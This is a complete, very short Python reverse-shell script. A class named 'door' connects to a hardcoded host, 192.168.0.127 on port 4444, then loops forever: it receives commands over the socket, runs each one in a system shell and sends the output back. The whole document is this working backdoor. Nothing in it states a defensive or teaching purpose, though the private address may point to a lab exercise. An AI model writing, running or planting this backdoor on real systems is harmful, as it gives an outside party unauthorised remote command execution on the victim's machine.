import socket
import subprocess

class door:
    def __init__(self,ip, puerto):
        self.access = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
        self.access.connect( (ip, puerto) )
    
    def command_func(self, command):
        return subprocess.check_output(command, shell=True)
        
    def run_commands(self):
        while True:
            command = self.access.recv(1024).decode()
            command_result = self.command_func(command)
            self.access.send(command_result)
        access.close()

door_real = door("192.168.0.127", 4444)
door_real.run_commands()
